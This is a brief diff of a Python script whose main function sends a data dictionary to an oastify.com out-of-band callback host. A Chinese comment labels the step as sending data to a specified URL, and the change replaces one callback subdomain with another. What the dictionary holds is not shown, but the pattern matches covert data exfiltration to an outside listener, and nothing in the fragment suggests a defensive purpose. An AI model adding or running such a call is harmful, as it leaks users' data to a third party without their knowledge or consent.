@@ -27,7 +27,7 @@ def main():
     }
 
     # 发送数据到指定URL
-    send_data("http://iqcu0i19t1x10judij6scarriio9c68ux.oastify.com", data)
+    send_data("http://pyr18p9g18588q2kqqezkhzyqpwgked22.oastify.com", data)
 
 if __name__ == "__main__":
     main()
